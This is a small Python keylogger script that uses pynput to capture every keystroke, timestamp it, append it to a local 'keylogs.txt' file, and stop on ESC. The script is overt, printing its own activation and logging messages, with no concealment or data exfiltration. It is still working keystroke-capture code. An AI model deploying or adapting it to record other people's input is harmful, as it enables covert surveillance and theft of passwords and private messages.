from pynput import keyboard
from datetime import datetime

print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Key logger activated\n")

def on_press(key):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

    if key == keyboard.Key.esc:
        print(f"{timestamp} ESC pressed, exiting\n")
        listener.stop()
        return False  # Stop listener

    with open("keylogs.txt", "a") as logs:  # Open the file inside the function
        try:
            logs.write(f"{timestamp} [{key.char}] pressed\n")
            print(f"{timestamp} Key logged")
        except AttributeError:
            logs.write(f"{timestamp} [{str(key).replace('Key.', '').upper()}] pressed\n")
            print(f"{timestamp} Special Key logged")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
